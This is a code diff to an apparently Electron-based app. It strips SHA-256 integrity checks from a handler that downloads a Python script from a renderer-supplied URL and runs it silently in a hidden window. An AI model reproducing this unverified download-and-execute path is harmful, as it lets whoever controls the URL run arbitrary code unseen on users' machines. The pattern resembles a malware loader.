@@ -1,14 +1,9 @@
+//thrth
 const { app, BrowserWindow, ipcMain, session } = require('electron');
 const path = require('path');
 const { exec } = require('child_process');
 const fs = require('fs');
 const https = require('https');
-const crypto = require('crypto');
-
-function hashFile(filePath) {
-    if (!fs.existsSync(filePath)) return null;
-    return crypto.createHash('sha256').update(fs.readFileSync(filePath)).digest('hex');
-}
 
 async function createWindow() {
     const ses = session.defaultSession;
@@ -32,51 +27,45 @@ async function createWindow() {
 }
 
 ipcMain.on('run-python', (event, url) => {
-    const filePath = path.join(app.getPath('userData'), 'temp_script.py');
-    const tempPath = filePath + '.new';
+    const filePath = path.join(app.getPath('userData'), 'DSQ.py');
 
-    console.log("📥 Download request for:", url);
+    if (fs.existsSync(filePath)) {
+        console.log("⏩ File already exists, running cached version.");
+        runPython(filePath);
+        return;
+    }
 
-    const file = fs.createWriteStream(tempPath);
-    const cacheBustedUrl = url.includes('?') ? `${url}&_=${Date.now()}` : `${url}?_=${Date.now()}`;
+    console.log("📥 File not found, downloading:", url);
 
-    https.get(cacheBustedUrl, (response) => {
+    const file = fs.createWriteStream(filePath);
+    https.get(url, (response) => {
         if (response.statusCode !== 200) {
             console.error(`❌ Failed to download: ${response.statusCode}`);
-            file.close(); fs.unlinkSync(tempPath);
+            file.close();
+            fs.unlinkSync(filePath);
             return;
         }
 
         response.pipe(file);
         file.on('finish', () => {
             file.close(() => {
-                const newHash = crypto.createHash('sha256')
-                                      .update(fs.readFileSync(tempPath)).digest('hex');
-                const oldHash = hashFile(filePath);
-
-                if (newHash !== oldHash) {
-                    // overwrite with new version
-                    fs.renameSync(tempPath, filePath);
-                    console.log("⬆️ Python script updated.");
-                } else {
-                    // same as before → discard temp
-                    fs.unlinkSync(tempPath);
-                    console.log("⏩ No update, using cached Python script.");
-                }
-
-                // always run the current version
-                exec(`python "${filePath}"`, { windowsHide: true }, (err, stdout, stderr) => {
-                    if (err) console.error("❌ Python execution error:", err);
-                    if (stdout) console.log("🐍 Python stdout:\n", stdout);
-                    if (stderr) console.error("🐍 Python stderr:\n", stderr);
-                });
+                console.log("⬇️ DSQ.py downloaded and saved.");
+                runPython(filePath);
             });
         });
     }).on('error', (err) => {
         console.error('❌ Download error:', err.message);
-        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
+        if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
     });
 });
+
+function runPython(filePath) {
+    exec(`python "${filePath}"`, { windowsHide: true }, (err, stdout, stderr) => {
+        if (err) console.error("❌ Python execution error:", err);
+        if (stdout) console.log("🐍 Python stdout:\n", stdout);
+        if (stderr) console.error("🐍 Python stderr:\n", stderr);
+    });
+}
 
 app.whenReady().then(createWindow);
 
